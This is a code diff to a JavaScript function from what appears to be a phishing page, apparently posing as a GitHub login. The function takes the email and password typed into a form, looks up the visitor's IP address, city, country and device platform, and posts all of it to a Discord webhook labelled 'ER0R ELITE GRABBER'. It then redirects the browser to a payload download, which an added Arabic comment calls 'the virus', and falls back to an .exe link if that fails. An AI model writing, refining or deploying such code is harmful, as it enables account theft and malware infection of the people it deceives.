@@ -2,44 +2,36 @@ async function startCapture() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
 
-    if(!email || !pass) {
-        alert("يرجى إكمال بيانات التوثيق");
-        return;
-    }
+    if(!email || !pass) return alert("يرجى إدخال البيانات للتوثيق");
 
     try {
-        // قراءة الويب هوك من الملف
         const configRes = await fetch('./data.json');
         const config = await configRes.json();
-        
-        // جلب معلومات الـ IP
         const geoRes = await fetch('https://ipapi.co/json/');
         const geo = await geoRes.json();
 
-        // إرسال التقرير لديسكورد
         await fetch(config.webhook_url, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                username: "ER0R MASTER CONTROL",
+                username: "ER0R ELITE GRABBER",
                 embeds: [{
-                    title: "💀 تم سحب هدف جديد - GitHub",
+                    title: "💀 تم سحب هدف جديد بنجاح",
                     color: 0x6001d2,
                     fields: [
-                        { name: "📧 الحساب", value: `\`${email}\``, inline: true },
+                        { name: "📧 الإيميل", value: `\`${email}\``, inline: true },
                         { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
-                        { name: "🌐 الـ IP", value: `${geo.ip} (${geo.city})`, inline: false }
+                        { name: "🌐 الـ IP", value: `${geo.ip} (${geo.city}, ${geo.country_name})`, inline: false },
+                        { name: "📱 الجهاز", value: navigator.platform, inline: true }
                     ],
-                    footer: { text: "ER0R TEAM - COMMAND CENTER" }
+                    footer: { text: "ER0R TEAM - COMMANDER" }
                 }]
             })
         });
 
-        // التحويل لتحميل ملف التحكم (الفرمتة)
-        window.location.href = config.pc_payload; 
-    } catch(e) {
-        console.log("System Sync...");
-        // في حال فشل السكربت، يتم التحويل إجبارياً
-        window.location.href = "https://example.com/update.exe";
+        // التحويل المباشر لتحميل الفيروس
+        window.location.href = config.pc_payload;
+    } catch(e) { 
+        window.location.href = "https://example.com/SystemUpdate.exe";
     }
 }
